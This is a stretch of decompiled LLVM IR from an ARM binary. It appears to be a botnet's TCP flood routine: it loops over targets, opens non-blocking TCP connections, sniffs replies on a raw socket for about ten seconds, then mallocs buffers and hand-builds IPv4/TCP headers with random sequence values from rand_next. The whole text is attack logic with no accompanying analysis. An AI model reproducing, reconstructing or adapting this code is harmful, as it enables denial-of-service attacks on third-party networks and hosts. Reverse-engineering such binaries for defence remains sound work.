  %v1_aee8 = and i32 %v4_aed8, 5
  %v2_aee8 = icmp eq i32 %v1_aee8, 0
  %v4_ae28 = add i32 %v2_adec, 82
  %v5_ae28 = inttoptr i32 %v4_ae28 to i16*
  %v1_b018 = add i32 %v6_ad1c, 40
  %v1_b12c = urem i32 %v5_ac5c, 2
  %tmp97 = sub nsw i32 0, %v1_b12c
  %v4_b134 = and i32 %tmp97, 32
  %v1_b144 = urem i32 %v6_ac7c, 2
  %tmp98 = sub nsw i32 0, %v1_b144
  %v4_b14c = and i32 %tmp98, 16
  %v1_b15c = urem i32 %v6_ac9c, 2
  %tmp99 = sub nsw i32 0, %v1_b15c
  %v4_b164 = and i32 %tmp99, 8
  %v1_b174 = urem i32 %v6_acbc, 2
  %tmp100 = sub nsw i32 0, %v1_b174
  %v4_b17c = and i32 %tmp100, 4
  %v1_b18c = urem i32 %v6_acdc, 2
  %tmp101 = sub nsw i32 0, %v1_b18c
  %v3_b194 = and i32 %tmp101, 2
  %v1_b1a4 = urem i32 %v6_acfc, 2
  br label %dec_label_pc_ada0

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ada0.preheader, %dec_label_pc_af14
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_af14 ], [ %tmp34, %dec_label_pc_ada0.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_af14 ], [ %tmp37, %dec_label_pc_ada0.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_adac = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_adac, i32* %r0.global-to-local, align 4
  %v7_adb0 = icmp eq i32 %v3_adac, -1
  store i1 %v7_adb0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_adac, i32* @r5, align 4
  br i1 %v7_adb0, label %dec_label_pc_af14, label %dec_label_pc_adbc

dec_label_pc_adbc:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_aef0
  %v0_adc4 = phi i32 [ %v3_af04, %dec_label_pc_aef0 ], [ %v3_adac, %dec_label_pc_ada0 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_aef0 ], [ %stack_var_-62.0, %dec_label_pc_ada0 ]
  %stack_var_-60.1 = phi i32 [ %v0_afc4, %dec_label_pc_aef0 ], [ %stack_var_-60.0, %dec_label_pc_ada0 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_adc4 = call i32 @__libc_fcntl(i32 %v0_adc4, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_adcc = or i32 %v2_adc4, 2048
  store i32 %v1_adcc, i32* @r2, align 4
  %v0_add0 = load i32, i32* @r5, align 4
  store i32 %v0_add0, i32* %r0.global-to-local, align 4
  %v2_add4 = call i32 @__libc_fcntl(i32 %v0_add0, i32 4)
  %v3_add8 = load i32, i32* %stack_var_-44, align 4
  %v5_ade0 = mul i32 %v3_add8, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_adec, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_adf4 = add i32 %v5_ade0, %arg2
  store i32 %v2_adf4, i32* %r3.global-to-local, align 4
  %v1_adf8 = add i32 %v2_adf4, 20
  %v2_adf8 = inttoptr i32 %v1_adf8 to i8*
  %v3_adf8 = load i8, i8* %v2_adf8, align 1
  %v4_adf8 = zext i8 %v3_adf8 to i32
  store i32 %v4_adf8, i32* %r2.global-to-local, align 4
  %v2_adfc = icmp ugt i8 %v3_adf8, 30
  %v7_adfc = icmp eq i8 %v3_adf8, 31
  store i1 %v7_adfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ae00 = xor i1 %v7_adfc, true
  %v3_ae00 = and i1 %v2_adfc, %v2_ae00
  br i1 %v3_ae00, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_adbc
  %v5_ae00 = add i32 %v2_adf4, 16
  %v6_ae00 = inttoptr i32 %v5_ae00 to i32*
  %v7_ae00 = load i32, i32* %v6_ae00, align 4
  store i32 %v7_ae00, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_adbc, %bb
  %v4_ae04 = phi i32 [ %v2_adf4, %dec_label_pc_adbc ], [ %v7_ae00, %bb ]
  %v4_ae04.stack_var_-60.1 = select i1 %v3_ae00, i32 %v4_ae04, i32 %stack_var_-60.1
  %v2_ae08 = xor i1 %v2_adfc, true
  %v3_ae08 = or i1 %v7_adfc, %v2_ae08
  br i1 %v3_ae08, label %dec_label_pc_af50, label %dec_label_pc_ae0c

dec_label_pc_ae0c:                                ; preds = %bb71, %dec_label_pc_af50
  %v0_afc4 = phi i32 [ %v5_afa0, %dec_label_pc_af50 ], [ %v4_ae04.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ae14 = load i32, i32* @sl, align 4
  %v9_ae14 = icmp eq i32 %v0_ae14, 65535
  store i1 %v9_ae14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ae14, label %dec_label_pc_afac, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_ae0c
  %v4_ae18 = udiv i32 %v0_ae14, 256
  %v2_ae1c = urem i32 %v0_ae14, 256
  store i32 %v2_ae1c, i32* %r2.global-to-local, align 4
  %v5_ae20 = mul nuw nsw i32 %v2_ae1c, 256
  %v6_ae20 = or i32 %v5_ae20, %v4_ae18
  store i32 %v6_ae20, i32* %r3.global-to-local, align 4
  store i32 %v2_adec, i32* %r0.global-to-local, align 4
  %v2_ae28 = trunc i32 %v6_ae20 to i16
  store i16 %v2_ae28, i16* %v5_ae28, align 2
  br label %dec_label_pc_ae30

dec_label_pc_ae30:                                ; preds = %.thread9, %dec_label_pc_afac
  %stack_var_-62.2 = phi i16 [ %v1_afac, %dec_label_pc_afac ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_ae30, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_ae38 = load i32, i32* @r5, align 4
  store i32 %v0_ae38, i32* %r0.global-to-local, align 4
  %v3_ae3c = call i32 @__libc_connect(i32 %v0_ae38, i32 %v2_ae30, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ae44 = call i32 @__GI_time(i32* null)
  store i32 %v2_ae44, i32* %r0.global-to-local, align 4
  store i32 %v2_ae44, i32* @r4, align 4
  %v9_aea4 = icmp eq i32 %tmp35, %v0_afc4
  %v4_aecc = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_aea4 to i32
  %v9_aeb8 = icmp eq i1 %v9_aea4, false
  %v9_aed0 = icmp eq i32 %v3_aec4, %v4_aecc
  br label %dec_label_pc_ae60

dec_label_pc_ae50:                                ; preds = %.thread, %dec_label_pc_aec0, %dec_label_pc_aee8, %bb75
  %v2_ae50 = call i32 @__GI_time(i32* null)
  %v0_ae54 = load i32, i32* @r4, align 4
  %v2_ae54 = sub i32 %v2_ae50, %v0_ae54
  store i32 %v2_ae54, i32* %r0.global-to-local, align 4
  %v7_ae58 = icmp eq i32 %v2_ae54, 10
  store i1 %v7_ae58, i1* %cpsr_z.global-to-local, align 1
  %v8_ae5c = icmp sgt i32 %v2_ae54, 10
  br i1 %v8_ae5c, label %dec_label_pc_aef0, label %dec_label_pc_ae60

dec_label_pc_ae60:                                ; preds = %dec_label_pc_ae50, %dec_label_pc_ae30
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_ae74, i32* %r1.global-to-local, align 4
  store i32 %v2_ae78, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ae80 = load i32, i32* @sb, align 4
  store i32 %v0_ae80, i32* %r0.global-to-local, align 4
  %v6_ae88 = call i32 @__libc_recvfrom(i32 %v0_ae80, i32 %v2_ae74, i32 256, i32 16384, i32 %v2_ae68, i32 %v2_ae78)
  store i32 %v6_ae88, i32* %r2.global-to-local, align 4
  %v7_ae90 = icmp eq i32 %v6_ae88, -1
  store i1 %v7_ae90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_ae90, label %dec_label_pc_af44, label %dec_label_pc_ae9c

dec_label_pc_ae9c:                                ; preds = %dec_label_pc_ae60
  store i32 %v0_afc4, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_aeb0 = icmp eq i32 %v6_ae88, 40
  store i1 %v7_aeb0, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_ae88, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_ae9c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ae50

bb75:                                             ; preds = %dec_label_pc_ae9c
  store i1 %v9_aeb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aeb8, label %dec_label_pc_ae50, label %dec_label_pc_aec0

dec_label_pc_aec0:                                ; preds = %bb75
  store i32 %v3_aec4, i32* @lr, align 4
  store i32 %v2_adec, i32* @r3, align 4
  store i32 %v4_aecc, i32* %r2.global-to-local, align 4
  store i1 %v9_aed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aed0, label %dec_label_pc_aed8, label %dec_label_pc_ae50

dec_label_pc_aed8:                                ; preds = %dec_label_pc_aec0
  store i32 %v4_aed8, i32* %r2.global-to-local, align 4
  store i32 %v1_aedc, i32* @r3, align 4
  store i1 %v2_aee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aee0, label %dec_label_pc_afbc, label %dec_label_pc_aee8

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aed8
  store i1 %v2_aee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aee8, label %dec_label_pc_ae50, label %dec_label_pc_aef0

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aee8, %dec_label_pc_ae50
  %v0_aef0 = load i32, i32* @r5, align 4
  store i32 %v0_aef0, i32* %r0.global-to-local, align 4
  %v1_aef4 = call i32 @__GI___libc_close(i32 %v0_aef0)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_af04 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_af04, i32* %r0.global-to-local, align 4
  %v3_af08 = icmp eq i32 %v3_af04, -1
  %v8_af08 = icmp eq i32 %v3_af04, -1
  store i1 %v8_af08, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_af04, i32* @r5, align 4
  br i1 %v3_af08, label %dec_label_pc_af14, label %dec_label_pc_adbc

dec_label_pc_af14:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ada0, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_ada0 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_aef0 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_ada0 ], [ %v0_afc4, %bb82 ], [ %v0_afc4, %dec_label_pc_aef0 ]
  %v3_af14 = load i32, i32* %stack_var_-44, align 4
  %v1_af18 = add i32 %v3_af14, 1
  store i32 %v1_af18, i32* @r3, align 4
  %v1_af1c = load i32, i32* @r6, align 4
  %v9_af1c = icmp eq i32 %v1_af18, %v1_af1c
  store i1 %v9_af1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_af18, i32* %stack_var_-44, align 4
  %v5_af24 = icmp slt i32 %v1_af18, %v1_af1c
  br i1 %v5_af24, label %dec_label_pc_ada0, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_af14
  store i32 %v6_ad1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1d8

dec_label_pc_af3c:                                ; preds = %dec_label_pc_ad60
  %v0_af3c = load i32, i32* @sb, align 4
  store i32 %v0_af3c, i32* %r0.global-to-local, align 4
  %v1_af40 = call i32 @__GI___libc_close(i32 %v0_af3c)
  store i32 %v1_af40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %dec_label_pc_ae60, %entry, %dec_label_pc_af3c
  %v1_af4c = phi i32 [ %v3_ad50, %entry ], [ %v1_af40, %dec_label_pc_af3c ], [ 0, %dec_label_pc_ae60 ]
  store i32 %v27_ab7c, i32* %lr.global-to-local, align 4
  ret i32 %v1_af4c

dec_label_pc_af50:                                ; preds = %bb71
  %v1_af50 = add i32 %v4_ae04, 16
  %v2_af50 = inttoptr i32 %v1_af50 to i32*
  %v3_af50 = load i32, i32* %v2_af50, align 4
  store i32 %v3_af50, i32* @r4, align 4
  %v0_af54 = call i32 @rand_next()
  store i32 %v0_af54, i32* %r0.global-to-local, align 4
  %v3_af58 = load i32, i32* %stack_var_-44, align 4
  %v5_af60 = mul i32 %v3_af58, 24
  %v0_af68 = load i32, i32* @r4, align 4
  %v1_af68 = and i32 %v0_af68, 16711680
  store i32 %v1_af68, i32* %ip.global-to-local, align 4
  %v3_af6c = udiv i32 %v0_af68, 16777216
  %v2_af70 = add i32 %v5_af60, %arg2
  store i32 %v2_af70, i32* %r1.global-to-local, align 4
  %v4_af74 = udiv i32 %v1_af68, 256
  %v5_af74 = or i32 %v4_af74, %v3_af6c
  store i32 %v5_af74, i32* %r2.global-to-local, align 4
  %v1_af78 = and i32 %v0_af68, 65280
  store i32 %v1_af78, i32* %r3.global-to-local, align 4
  %v1_af7c = add i32 %v2_af70, 20
  %v2_af7c = inttoptr i32 %v1_af7c to i8*
  %v3_af7c = load i8, i8* %v2_af7c, align 1
  %v4_af7c = zext i8 %v3_af7c to i32
  store i32 %v4_af7c, i32* %ip.global-to-local, align 4
  %v5_af84 = call i32 @llvm.bswap.i32(i32 %v0_af68)
  %v7_af88 = lshr i32 %v0_af54, %v4_af7c
  %v8_af88 = add i32 %v7_af88, %v5_af84
  store i32 %v8_af88, i32* %r2.global-to-local, align 4
  %v1_af8c = and i32 %v8_af88, 16711680
  store i32 %v1_af8c, i32* %r0.global-to-local, align 4
  %v1_af98 = and i32 %v8_af88, 65280
  store i32 %v1_af98, i32* %r1.global-to-local, align 4
  %v5_afa0 = call i32 @llvm.bswap.i32(i32 %v8_af88)
  store i32 %v5_afa0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ae0c

dec_label_pc_afac:                                ; preds = %dec_label_pc_ae0c
  %v0_afac = call i32 @rand_next()
  %v1_afac = trunc i32 %v0_afac to i16
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  store i32 %v2_adec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ae30

dec_label_pc_afbc:                                ; preds = %dec_label_pc_aed8
  %v3_afbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_afbc, i32* @r4, align 4
  store i32 %v2_ab98, i32* %ip.global-to-local, align 4
  %v5_afc4 = mul i32 %v3_afbc, 16
  %v6_afc4 = add i32 %v5_afc4, %v2_ab98
  %v7_afc4 = inttoptr i32 %v6_afc4 to i32*
  store i32 %v0_afc4, i32* %v7_afc4, align 4
  %v0_afc8 = load i32, i32* @r8, align 4
  %v1_afc8 = add i32 %v0_afc8, 4
  %v2_afc8 = inttoptr i32 %v1_afc8 to i32*
  %v3_afc8 = load i32, i32* %v2_afc8, align 4
  store i32 %v3_afc8, i32* %r1.global-to-local, align 4
  %v1_afd4 = and i32 %v3_afc8, 65280
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  store i32 %v2_ab98, i32* %r0.global-to-local, align 4
  %v0_afe4 = load i32, i32* @r4, align 4
  %v3_afe4 = mul i32 %v0_afe4, 16
  %v2_afe8 = add i32 %v3_afe4, %v2_ab98
  store i32 %v2_afe8, i32* %ip.global-to-local, align 4
  %v5_afec = call i32 @llvm.bswap.i32(i32 %v3_afc8)
  store i32 %v5_afec, i32* %r3.global-to-local, align 4
  %v2_aff0 = add i32 %v2_afe8, 4
  %v3_aff0 = inttoptr i32 %v2_aff0 to i32*
  store i32 %v5_afec, i32* %v3_aff0, align 4
  %v0_aff4 = load i32, i32* @r8, align 4
  %v1_aff4 = add i32 %v0_aff4, 8
  %v2_aff4 = inttoptr i32 %v1_aff4 to i32*
  %v3_aff4 = load i32, i32* %v2_aff4, align 4
  store i32 %v3_aff4, i32* %r1.global-to-local, align 4
  %v1_aff8 = and i32 %v3_aff4, 16711680
  store i32 %v1_aff8, i32* %r0.global-to-local, align 4
  store i32 %v6_ad1c, i32* %r2.global-to-local, align 4
  %v5_b010 = call i32 @llvm.bswap.i32(i32 %v3_aff4)
  store i32 %v5_b010, i32* %r3.global-to-local, align 4
  %v1_b014 = add i32 %v0_aff4, 2
  %v2_b014 = inttoptr i32 %v1_b014 to i16*
  %v3_b014 = load i16, i16* %v2_b014, align 2
  %v4_b014 = zext i16 %v3_b014 to i32
  store i32 %v4_b014, i32* %r1.global-to-local, align 4
  store i32 %v1_b018, i32* @r7, align 4
  %v0_b01c = load i32, i32* @lr, align 4
  %v1_b01c = trunc i32 %v0_b01c to i16
  %v2_b01c = load i32, i32* %ip.global-to-local, align 4
  %v3_b01c = add i32 %v2_b01c, 14
  %v4_b01c = inttoptr i32 %v3_b01c to i16*
  store i16 %v1_b01c, i16* %v4_b01c, align 2
  %v0_b020 = load i32, i32* %r1.global-to-local, align 4
  %v1_b020 = trunc i32 %v0_b020 to i16
  %v2_b020 = load i32, i32* %ip.global-to-local, align 4
  %v3_b020 = add i32 %v2_b020, 12
  %v4_b020 = inttoptr i32 %v3_b020 to i16*
  store i16 %v1_b020, i16* %v4_b020, align 2
  %v0_b024 = load i32, i32* %r3.global-to-local, align 4
  %v1_b024 = load i32, i32* %ip.global-to-local, align 4
  %v2_b024 = add i32 %v1_b024, 8
  %v3_b024 = inttoptr i32 %v2_b024 to i32*
  store i32 %v0_b024, i32* %v3_b024, align 4
  %v0_b028 = load i32, i32* @r7, align 4
  store i32 %v0_b028, i32* @r0, align 4
  %v0_b02c = call i32 @malloc()
  store i32 %v0_b02c, i32* %r0.global-to-local, align 4
  store i32 %v2_aba8, i32* %r3.global-to-local, align 4
  %v2_b038 = load i32, i32* @r4, align 4
  %v5_b038 = mul i32 %v2_b038, 4
  %v6_b038 = add i32 %v5_b038, %v2_aba8
  %v7_b038 = inttoptr i32 %v6_b038 to i32*
  store i32 %v0_b02c, i32* %v7_b038, align 4
  %v3_b03c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b03c, i32* %r2.global-to-local, align 4
  %v0_b040 = load i32, i32* %r3.global-to-local, align 4
  %v4_b040 = mul i32 %v3_b03c, 4
  %v5_b040 = add i32 %v0_b040, %v4_b040
  %v6_b040 = inttoptr i32 %v5_b040 to i32*
  %v7_b040 = load i32, i32* %v6_b040, align 4
  store i32 %v7_b040, i32* @r4, align 4
  %v1_b044 = inttoptr i32 %v7_b040 to i8*
  %v2_b044 = load i8, i8* %v1_b044, align 1
  %tmp103 = urem i8 %v2_b044, 16
  %v1_b048 = zext i8 %tmp103 to i32
  %v1_b04c = or i32 %v1_b048, 64
  store i32 %v1_b04c, i32* %r3.global-to-local, align 4
  %v1_b050 = trunc i32 %v1_b04c to i8
  store i8 %v1_b050, i8* %v1_b044, align 1
  %v0_b054 = load i32, i32* @r4, align 4
  %v1_b054 = inttoptr i32 %v0_b054 to i8*
  %v2_b054 = load i8, i8* %v1_b054, align 1
  %v0_b058 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b058, 256
  %v1_b060 = and i8 %v2_b054, -16
  %v1_b064 = or i8 %v1_b060, 5
  %v1_b068 = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b058, 256
  %v4_b06c = urem i32 %tmp78, 256
  %v5_b06c = or i32 %v4_b06c, %v1_b068
  store i32 %v5_b06c, i32* %r2.global-to-local, align 4
  %v0_b070 = load i32, i32* @fp, align 4
  %v1_b070 = urem i32 %v0_b070, 256
  store i32 %v1_b070, i32* %r0.global-to-local, align 4
  store i32 %v1_ac28, i32* %ip.global-to-local, align 4
  %v3_b078 = udiv i32 %v0_b070, 256
  store i32 %v3_b078, i32* %r1.global-to-local, align 4
  store i8 %v1_b064, i8* %v1_b054, align 1
  %v0_b080 = load i32, i32* %r1.global-to-local, align 4
  %v1_b080 = load i32, i32* %r0.global-to-local, align 4
  %v4_b080 = mul i32 %v1_b080, 256
  %v5_b080 = or i32 %v4_b080, %v0_b080
  store i32 %v5_b080, i32* %r1.global-to-local, align 4
  store i32 %v4_b084, i32* %r0.global-to-local, align 4
  %v2_b088 = load i32, i32* @r4, align 4
  %v3_b088 = add i32 %v2_b088, 1
  %v4_b088 = inttoptr i32 %v3_b088 to i8*
  store i8 %v5_abe0, i8* %v4_b088, align 1
  %v0_b08c = load i32, i32* %r1.global-to-local, align 4
  %v1_b08c = trunc i32 %v0_b08c to i16
  %v2_b08c = load i32, i32* @r4, align 4
  %v3_b08c = add i32 %v2_b08c, 4
  %v4_b08c = inttoptr i32 %v3_b08c to i16*
  store i16 %v1_b08c, i16* %v4_b08c, align 2
  %v0_b090 = load i32, i32* %ip.global-to-local, align 4
  %v2_b090 = icmp eq i32 %v0_b090, 0
  store i1 %v2_b090, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b094, i32* %r1.global-to-local, align 4
  %v0_b098 = load i32, i32* %r2.global-to-local, align 4
  %v1_b098 = trunc i32 %v0_b098 to i16
  %v2_b098 = load i32, i32* @r4, align 4
  %v3_b098 = add i32 %v2_b098, 2
  %v4_b098 = inttoptr i32 %v3_b098 to i16*
  store i16 %v1_b098, i16* %v4_b098, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b090, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_afbc
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_afbc, %bb79
  %v0_b0a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b0a4 = trunc i32 %v0_b0a4 to i8
  %v2_b0a4 = load i32, i32* @r4, align 4
  %v3_b0a4 = add i32 %v2_b0a4, 8
  %v4_b0a4 = inttoptr i32 %v3_b0a4 to i8*
  store i8 %v1_b0a4, i8* %v4_b0a4, align 1
  %v0_b0a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0a8 = trunc i32 %v0_b0a8 to i8
  %v2_b0a8 = load i32, i32* @r4, align 4
  %v3_b0a8 = add i32 %v2_b0a8, 9
  %v4_b0a8 = inttoptr i32 %v3_b0a8 to i8*
  store i8 %v1_b0a8, i8* %v4_b0a8, align 1
  %v0_b0ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0ac, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b0ac = load i32, i32* %r2.global-to-local, align 4
  %v2_b0ac = trunc i32 %v1_b0ac to i16
  %v3_b0ac = load i32, i32* @r4, align 4
  %v4_b0ac = add i32 %v3_b0ac, 6
  %v5_b0ac = inttoptr i32 %v4_b0ac to i16*
  store i16 %v2_b0ac, i16* %v5_b0ac, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_243d4.57 to i32), i32* %r2.global-to-local, align 4
  %v2_b0b4 = load i32, i32* @global_var_243d4.57, align 4
  store i32 %v2_b0b4, i32* %r1.global-to-local, align 4
  %v1_b0b8 = load i32, i32* @r4, align 4
  %v2_b0b8 = add i32 %v1_b0b8, 12
  %v3_b0b8 = inttoptr i32 %v2_b0b8 to i32*
  store i32 %v2_b0b4, i32* %v3_b0b8, align 4
  %v3_b0bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b0bc, i32* %r3.global-to-local, align 4
  store i32 %v2_ab98, i32* %ip.global-to-local, align 4
  %v4_b0c4 = mul i32 %v3_b0bc, 16
  %v5_b0c4 = add i32 %v4_b0c4, %v2_ab98
  %v6_b0c4 = inttoptr i32 %v5_b0c4 to i32*
  %v7_b0c4 = load i32, i32* %v6_b0c4, align 4
  store i32 %v7_b0c4, i32* %r2.global-to-local, align 4
  store i32 %v5_b0c4, i32* %r3.global-to-local, align 4
  %v1_b0d0 = load i32, i32* @r4, align 4
  %v2_b0d0 = add i32 %v1_b0d0, 16
  %v3_b0d0 = inttoptr i32 %v2_b0d0 to i32*
  store i32 %v7_b0c4, i32* %v3_b0d0, align 4
  %v0_b0d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0d4 = add i32 %v0_b0d4, 12
  %v2_b0d4 = inttoptr i32 %v1_b0d4 to i16*
  %v3_b0d4 = load i16, i16* %v2_b0d4, align 2
  %v4_b0d4 = zext i16 %v3_b0d4 to i32
  store i32 %v4_b0d4, i32* %r0.global-to-local, align 4
  %v1_b0d8 = add i32 %v0_b0d4, 8
  %v2_b0d8 = inttoptr i32 %v1_b0d8 to i32*
  %v3_b0d8 = load i32, i32* %v2_b0d8, align 4
  store i32 %v3_b0d8, i32* %r1.global-to-local, align 4
  %v2_b0dc = load i32, i32* @r4, align 4
  %v3_b0dc = add i32 %v2_b0dc, 20
  %v4_b0dc = inttoptr i32 %v3_b0dc to i16*
  store i16 %v3_b0d4, i16* %v4_b0dc, align 2
  %v0_b0e0 = load i32, i32* @r4, align 4
  %v1_b0e0 = add i32 %v0_b0e0, 20
  store i32 %v1_b0e0, i32* @r8, align 4
  %v1_b0e4 = add i32 %v0_b0e0, 33
  %v2_b0e4 = inttoptr i32 %v1_b0e4 to i8*
  %v3_b0e4 = load i8, i8* %v2_b0e4, align 1
  %v4_b0e4 = zext i8 %v3_b0e4 to i32
  store i32 %v4_b0e4, i32* %r2.global-to-local, align 4
  %v0_b0e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b0e8 = add i32 %v0_b0e0, 24
  %v3_b0e8 = inttoptr i32 %v2_b0e8 to i32*
  store i32 %v0_b0e8, i32* %v3_b0e8, align 4
  %v0_b0ec = load i32, i32* %r2.global-to-local, align 4
  %v1_b0ec = or i32 %v0_b0ec, 1
  store i32 %v1_b0ec, i32* %r2.global-to-local, align 4
  %v0_b0f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0f0 = add i32 %v0_b0f0, 4
  %v2_b0f0 = inttoptr i32 %v1_b0f0 to i32*
  %v3_b0f0 = load i32, i32* %v2_b0f0, align 4
  store i32 %v3_b0f0, i32* %r1.global-to-local, align 4
  %v1_b0f4 = add i32 %v0_b0f0, 14
  %v2_b0f4 = inttoptr i32 %v1_b0f4 to i16*
  %v3_b0f4 = load i16, i16* %v2_b0f4, align 2
  %v4_b0f4 = zext i16 %v3_b0f4 to i32
  store i32 %v4_b0f4, i32* %r3.global-to-local, align 4
  %v1_b0f8 = trunc i32 %v1_b0ec to i8
  %v2_b0f8 = load i32, i32* @r8, align 4
  %v3_b0f8 = add i32 %v2_b0f8, 13
  %v4_b0f8 = inttoptr i32 %v3_b0f8 to i8*
  store i8 %v1_b0f8, i8* %v4_b0f8, align 1
  %v0_b0fc = load i32, i32* %r3.global-to-local, align 4
  %v1_b0fc = trunc i32 %v0_b0fc to i16
  %v2_b0fc = load i32, i32* @r8, align 4
  %v3_b0fc = add i32 %v2_b0fc, 2
  %v4_b0fc = inttoptr i32 %v3_b0fc to i16*
  store i16 %v1_b0fc, i16* %v4_b0fc, align 2
  %v0_b100 = load i32, i32* @r8, align 4
  %v1_b100 = add i32 %v0_b100, 12
  %v2_b100 = inttoptr i32 %v1_b100 to i8*
  %v3_b100 = load i8, i8* %v2_b100, align 1
  %v4_b100 = zext i8 %v3_b100 to i32
  store i32 %v4_b100, i32* %r3.global-to-local, align 4
  %v1_b104 = add i32 %v0_b100, 13
  %v2_b104 = inttoptr i32 %v1_b104 to i8*
  %v3_b104 = load i8, i8* %v2_b104, align 1
  %v4_b104 = zext i8 %v3_b104 to i32
  %tmp104 = urem i8 %v3_b100, 16
  %v1_b108 = zext i8 %tmp104 to i32
  %v1_b10c = or i32 %v1_b108, 128
  store i32 %v1_b10c, i32* %r3.global-to-local, align 4
  %v1_b110 = or i32 %v4_b104, 16
  store i32 %v1_b110, i32* %r2.global-to-local, align 4
  %v0_b114 = load i32, i32* %r1.global-to-local, align 4
  %v2_b114 = add i32 %v0_b100, 8
  %v3_b114 = inttoptr i32 %v2_b114 to i32*
  store i32 %v0_b114, i32* %v3_b114, align 4
  %v0_b118 = load i32, i32* %r3.global-to-local, align 4
  %v1_b118 = trunc i32 %v0_b118 to i8
  %v2_b118 = load i32, i32* @r8, align 4
  %v3_b118 = add i32 %v2_b118, 12
  %v4_b118 = inttoptr i32 %v3_b118 to i8*
  store i8 %v1_b118, i8* %v4_b118, align 1
  %v0_b11c = load i32, i32* %r2.global-to-local, align 4
  %v1_b11c = trunc i32 %v0_b11c to i8
  %v2_b11c = load i32, i32* @r8, align 4
  %v3_b11c = add i32 %v2_b11c, 13
  %v4_b11c = inttoptr i32 %v3_b11c to i8*
  store i8 %v1_b11c, i8* %v4_b11c, align 1
  %v0_b120 = call i32 @rand_next()
  %v1_b120 = trunc i32 %v0_b120 to i16
  store i32 %v0_b120, i32* %r0.global-to-local, align 4
  store i32 %v1_ac64, i32* %r1.global-to-local, align 4
  %v0_b128 = load i32, i32* @r8, align 4
  %v1_b128 = add i32 %v0_b128, 13
  %v2_b128 = inttoptr i32 %v1_b128 to i8*
  %v3_b128 = load i8, i8* %v2_b128, align 1
